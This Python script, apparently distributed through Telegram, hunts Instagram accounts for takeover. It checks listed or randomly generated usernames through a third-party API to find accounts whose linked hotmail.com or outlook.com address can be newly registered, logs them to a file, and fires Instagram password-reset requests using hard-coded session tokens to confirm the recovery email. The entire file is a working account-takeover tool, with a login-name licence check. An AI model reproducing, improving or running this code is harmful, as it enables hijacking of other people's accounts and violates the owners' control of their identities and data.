import requests 
import time
import threading
import random
import os
import uuid
import sys
ru =["u-0-_-a-2-5-9","u-0-_-a-2-5-0","u-0-_-a-2-9-3","u-0-_-a-5-1-5","u-0-_-a-2-7-3","u-0-_-a-2-7-5","u-0-_-a-4-5-5"]

uuid =str(os.getlogin())
id = "-".join(uuid)
print(f"ID : {id}")
if id in ru : 
    print(f'Acctive .... : {id}')
    time.sleep(2)
    os.system("clear")

else:
    os.system('clear')
    print(f'The ID No Acctive : {id} - Telegram @BBMZZ - @Zaidkarrem')
    sys.exit()

class Checker:
    def __init__(self) :
        self.a = 0
        self.b = 0
        self.f = 0
        self.s = 0
        self.n = 0
        self.j = 0
        self.r = 0
        self.e = 0
        self.u = 0
        self.o = 0
        self.k = 0
        self.num = 0
        self.telegram = "@BBMZZ"
        print("[1] - Hotmail\n[2] - Outlook\n[3] - Random Choice Hotmail\n[4] - Call Checker [Hotmail - Outlook]\n[!] - Saved the hunt in Name File (acctive.txt)".upper())
        self.un = input("[=] - Enter Your Number list : ")
        if self.un =="1":
            os.system('clear')
            self.hotmail()
        elif self.un =="2":
            os.system('clear')
            self.outlook()
        elif self.un =="3":
            os.system('clear')
            self.ran()
        elif self.un=="4":
            os.system('clear')
            self.filecall()
        
    def filecall(self):
        self.fil1 = input("[=] - Enter Your Name File : ")
        try:
            self.ix = open(self.fil1,"r").read().splitlines()
            threading.Thread(target=self.ho1).start()
            threading.Thread(target=self.out).start()
            
           

        except FileNotFoundError as error:
            self.fo = "The Name File Error in Phone .!".upper()
            sys.exit()
    def ho1(self):
        for self.ra in self.ix:
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}').text
            if ('"OK"') in self.url:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.ra}').json()['status']
                if self.url2=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.ra}@hotmail.com\n')
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:
                        ge = requests.get(url2,headers=head2).json()
                        id = ge['data']['user']['id']
                        headers1 = {
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            }
                        data3 = {
                            'ig_sig_key_version': '4',
                            "user_id":id
                        }
                        try:
                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                            try:
                                rs =str(res['obfuscated_email'])
                                print(f"Email | {self.ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                            except KeyError as error:
                                print('error')
                        except requests.exceptions.ConnectionError as error:
                            continue
                    except requests.exceptions.ConnectionError as error:
                        continue
                    self.a+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
                else:
                    self.s+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
            else:
                self.u+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
        print("Complete File .")
    def out(self):
        for self.ra in self.ix:
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/outlook/{self.ra}').text
            if ('"OK"') in self.url:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/outlook/zaid/{self.ra}').json()['status']
                if self.url2=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.ra}@outlook.com\n')
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:
                        ge = requests.get(url2,headers=head2).json()
                        id = ge['data']['user']['id']
                        headers1 = {
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            }
                        data3 = {
                            'ig_sig_key_version': '4',
                            "user_id":id
                        }
                        try:
                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                            try:
                                rs =str(res['obfuscated_email'])
                                print(f"Email | {self.ra}@outlook.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                            except KeyError as error:
                                print('error')
                        except requests.exceptions.ConnectionError as error:
                            continue
                    except requests.exceptions.ConnectionError as error:
                        continue
                    self.f+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
                else:
                    self.k+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
            else:
                self.e+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |\nOk | {self.f} | O.B | {self.k} | B.I | {self.e} | Telegram | {self.telegram} |')
        print("Complete File .")
        
    def ran(self):
        self.list='qwertyuioplkjhgfdsazxcvvbnm'
        try : 
            self.nmb = int(input("[=] - Enter Your Number Random ? 6...10 : ").upper())
            if self.nmb >5:
                self.number()
              
            elif self.nmb >11:
                self.er1 = "The number is very large.".upper()
                print(self.er1)
        except ValueError as error:
            self.er = "Alphabet letters cannot be used".upper()
            print(self.er)
            sys.exit()
    def number(self):
        while True :
            self.rand = str(''.join(random.choice(self.list) for i in range(self.nmb)))
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.rand}').text
            if ('"OK"') in self.url:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.rand}').json()['status']
                if self.url2=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.rand}@hotmail.com\n')
                    self.a+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                else:
                    self.s+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
            else:
                self.u+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')



            
    
    def outlook(self):
        self.fil = input("[=] - Enter Your Name File : ".upper())
        try:
            self.ope = open(self.fil,'r').read().splitlines()

        except FileNotFoundError as error:
            self.err="THE NAME FILE ERROR IN PHONE !"
            print(self.err)
            sys.exit()
        for self.ra in self.ope:
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/outlook/{self.ra}').text
            if ('"OK"') in self.url:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/outlook/zaid/{self.ra}').json()['status']
                if self.url2=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.ra}@outlook.com\n')
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:
                        ge = requests.get(url2,headers=head2).json()
                        id = ge['data']['user']['id']
                        headers1 = {
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            }
                        data3 = {
                            'ig_sig_key_version': '4',
                            "user_id":id
                        }
                        try:
                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                            try:
                                rs =str(res['obfuscated_email'])
                                print(f"Email | {self.ra}@outlook.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                            except KeyError as error:
                                print('error')
                        except requests.exceptions.ConnectionError as error:
                            continue
                    except requests.exceptions.ConnectionError as error:
                        continue
                    self.a+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | O.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                else:
                    self.s+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | O.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
            else:
                self.u+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | O.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
        print("Complete File .")



    def hotmail(self):
        self.fil = input("[=] - Enter Your Name File : ")
        try:
            self.ope = open(self.fil,'r').read().splitlines()

        except FileNotFoundError as error:
            self.err="THE NAME FILE ERROR IN PHONE !"
            print(self.err)
            sys.exit()
        for self.ra in self.ope:
            self.url =requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/instagram/hotmail/{self.ra}').text
            if ('"OK"') in self.url:
                self.url2 = requests.get(f'https://api-m-525f11315c3c.herokuapp.com/api/hotmail/zaid/{self.ra}').json()['status']
                if self.url2=='ok':
                    with open(f'acctive.txt','a') as f0:
                        f0.write(f'{self.ra}@hotmail.com\n')
                    url2='https://www.instagram.com/api/v1/users/web_profile_info/?username={}'.format(self.ra)
                    head2={
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'cookie': 'dwjhdjwqdkqldususs9dikkxjsahxjqdqdq',
                        'referer': 'https://www.instagram.com/gzik/?a=1&d=dis',
                        'sec-ch-prefers-color-scheme': 'light',
                        'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                        'viewport-width': '917',
                        'x-asbd-id': '198387',
                        'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                        'x-ig-app-id': '936619743392459',
                        'x-ig-www-claim': 'hmac.AR2YVBVpnG3H4yWcpVkZPU__dxvBtni5oqdISKu1TJqqP0xo',
                        'x-instagram-ajax': '1006627630',
                        'x-requested-with': 'XMLHttpRequest'
                    }
                    try:
                        ge = requests.get(url2,headers=head2).json()
                        id = ge['data']['user']['id']
                        headers1 = {
                                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                                'viewport-width': '917',
                                'x-asbd-id': '198387',
                                'x-csrftoken': 'jYtUPej72VOcpPBby1dtNJUOyYkxLTCH',
                            }
                        data3 = {
                            'ig_sig_key_version': '4',
                            "user_id":id
                        }
                        try:
                            res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers1, data=data3).json()
                            try:
                                rs =str(res['obfuscated_email'])
                                print(f"Email | {self.ra}@Hotmail.com | Reste Username | {rs} | Telegram | @BBMZZ |\n")
                            except KeyError as error:
                                print('error')
                        except requests.exceptions.ConnectionError as error:
                            continue
                    except requests.exceptions.ConnectionError as error:
                        continue
                    self.a+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
                else:
                    self.s+=1
                    os.system('cls' if os.name=='nt'else"clear")
                    print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
            else:
                self.u+=1
                os.system('cls' if os.name=='nt'else"clear")
                print(f'Ok | {self.a} | H.B | {self.s} | B.I | {self.u} | Telegram | {self.telegram} |')
        print("Complete File .")



Checker()
    
